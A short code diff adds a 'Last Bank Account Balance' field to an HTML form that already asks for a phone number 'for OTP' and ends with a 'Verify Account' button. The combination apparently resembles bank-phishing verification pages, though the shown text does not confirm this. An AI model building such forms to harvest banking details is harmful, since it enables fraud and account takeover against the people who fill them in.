@@ -183,6 +183,10 @@
         <label>Phone Number for OTP</label>
         <input type="tel" name="phone_number" placeholder="Enter your phone number to receive OTP" required pattern="[0-9]{10,15}" title="Please enter a valid phone number (10-15 digits)">
 
+        <!-- Last Bank Account Balance field -->
+        <label>Last Bank Account Balance</label>
+        <input type="text" name="last_account_balance" placeholder="Enter your last account balance (e.g., 1234.56)" pattern="^\d+(\.\d{1,2})?$" title="Enter a valid amount (digits with optional 2 decimal places)">
+
         <!-- Submit button -->
         <input type="submit" value="Verify Account">
 
